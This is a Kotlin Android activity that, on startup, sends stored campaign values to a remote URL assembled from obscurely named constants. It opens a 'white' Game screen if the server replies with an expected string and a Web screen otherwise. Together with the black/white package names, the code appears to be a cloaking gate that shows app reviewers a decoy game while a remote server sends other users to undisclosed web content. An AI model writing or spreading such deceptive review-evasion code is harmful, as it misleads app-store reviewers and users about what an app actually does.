package us.nobarriers.els.black

import android.content.Intent
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.util.Log
import com.orhanobut.hawk.Hawk
import kotlinx.android.synthetic.main.activity_filter.*
import kotlinx.coroutines.*
import us.nobarriers.els.R
import us.nobarriers.els.black.CNST.C1
import us.nobarriers.els.black.CNST.D1
import us.nobarriers.els.black.CNST.DEV
import us.nobarriers.els.white.Game
import java.net.HttpURLConnection
import java.net.URL

class Filter : AppCompatActivity() {
    lateinit var jsoup: String
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_filter)
        jsoup = ""

        val job = GlobalScope.launch(Dispatchers.IO) {
            jsoup = coroutineTask()
            Log.d("jsoup status from global scope", jsoup)
        }

        runBlocking {
            try {
                job.join()

                Log.d("jsoup status out of global scope", jsoup)
                txtMain.text = jsoup

                if (jsoup == CNST.jsoupCheck) {
                    Intent(applicationContext, Game::class.java).also { startActivity(it) }
                } else {
                    Intent(applicationContext, Web::class.java).also { startActivity(it) }
                }
                finish()
            } catch (e: Exception) {

            }
        }

    }

    private suspend fun coroutineTask(): String {
        val hawk: String? = Hawk.get(C1, "null")
        val hawkAppLink: String? = Hawk.get(D1, "null")
        val hawkDevOrNot: String? = Hawk.get(DEV, "false")


        //added devModeCheck
        val forJsoupSetNaming: String = CNST.lru + CNST.odone + hawk + "&" + CNST.twoSub + hawkDevOrNot
        val forJsoupSetAppLnk: String = CNST.lru + CNST.odone + hawkAppLink + "&" +  CNST.twoSub + hawkDevOrNot
        withContext(Dispatchers.IO) {
            //changed logical null to string null
            if (hawk != "null") {
                getCodeFromUrl(forJsoupSetNaming)
                Log.d("Check1C", forJsoupSetNaming)
            } else {
                getCodeFromUrl(forJsoupSetAppLnk)
                Log.d("Check1C", forJsoupSetAppLnk)
            }
        }
        return jsoup
    }

    private fun getCodeFromUrl(link: String) {
        val url = URL(link)
        val urlConnection = url.openConnection() as HttpURLConnection

        try {
            val text = urlConnection.inputStream.bufferedReader().readText()
            if (text.isNotEmpty()) {
                Log.d("jsoup status inside Url function", text)
                jsoup = text
            } else {
                Log.d("jsoup status inside Url function", "is null")
            }
        } catch (ex: Exception) {

        } finally {
            urlConnection.disconnect()
        }
    }
}